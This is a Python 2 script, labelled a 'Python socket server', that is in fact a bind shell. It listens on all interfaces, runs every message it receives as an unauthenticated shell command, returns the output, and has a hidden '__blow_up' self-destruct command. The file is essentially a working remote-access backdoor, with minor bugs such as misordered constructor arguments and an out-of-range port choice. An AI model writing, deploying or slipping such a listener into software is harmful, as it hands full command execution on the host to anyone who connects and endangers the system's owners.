import socket
import threading
import subprocess
import argparse
import random
import time
import struct



class Server_Socket:
	def __init__(self, port, receive_message, send_message, connection = None, _max_conn = 5, sock = None, host = "0.0.0.0"):
		if sock is None:
			self.port = port
			self.host = host
			self.connection = connection
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.sock.bind((host, port))
			self.received_message = ""
			self.sock.listen(_max_conn)
		else:
			self.sock = sock
		
	def Send_Message(self, conn, _msg):
		_bytes = 0
		msg_to_send = struct.pack('>I', len(_msg)) + _msg
		while _bytes < len(msg_to_send):
			msg_sent = conn.send(msg_to_send[_bytes:])
			if msg_sent == 0:
				raise RuntimeError("Socket Closed")
			_bytes += msg_sent
		print str(_bytes)
		return 0
	
	def Server_Recv_All(self, conn, n):
		data = ""
		while len(data) < n:
			p = conn.recv(n - len(data))
			if not p:
				return None
			data += p
		return data
		
	def Receive_Message(self):
		global ACTIVE_SOCKET
		_bytes = 0
		while ACTIVE_SOCKET:
			if self.connection is None:
				self.connection, connection_address = self.sock.accept()
			_message_length = self.Server_Recv_All(self.connection, 4)
			if not _message_length:
				return None
			mlen = struct.unpack('>I', _message_length)[0]
			self.received_message = self.Server_Recv_All(self.connection, mlen)
			if 'exit' in self.received_message:
				print "Connection: " + str(self.connection) + " is closed"
				self.connection.close()
				self.connection = None
				return self.connection
			elif '__blow_up' in self.received_message:
				print "Self destruct initiated"
				ACTIVE_SOCKET = False
				self.connection.close()
				self.sock.close()
			else:
				raw_out = subprocess.check_output(self.received_message, stderr=subprocess.STDOUT, shell=True)
				if self.Send_Message(self.connection, raw_out) == 0:
					_t = threading.current_thread()
					break
			
	def Run(self, tcp_port, addr, conn):
		if conn is None:
			print "--------------------"
			print "Server at IP: " + addr + " is now running on port: " + str(tcp_port) + "."
			print "--------------------"
		t1 = threading.Thread(name="Test_Thread",target=self.Receive_Message)
		t1.start()
		t1.join()
		

#Instantiating the parser and establishing the help data
parser = argparse.ArgumentParser ( description = "Python socket server" )
parser.add_argument ( "-p", "--port", help = "Port to bind", required = False )
parser.add_argument ( "-m", "--max", help = "Max connections allow to connect", required = False )
parser.add_argument ( "-i", "--interface", help = "IPv4 address to listen on", required = False )
args = parser.parse_args()

ACTIVE_SOCKET = True

if __name__ == "__main__":
	server_socket = None
	while ACTIVE_SOCKET:
		if args.port is None:
			port = random.randint(1024, 65536)
		else:
			port = int(args.port)
		maxconnections = args.max
		if args.interface is None:
			server_address = "0.0.0.0"
		else:
			server_address = str(args.interface)
		if server_socket is None:
			server_socket = Server_Socket(port, maxconnections, server_address)
		server_socket.Run(server_socket.port, server_socket.host, server_socket.connection)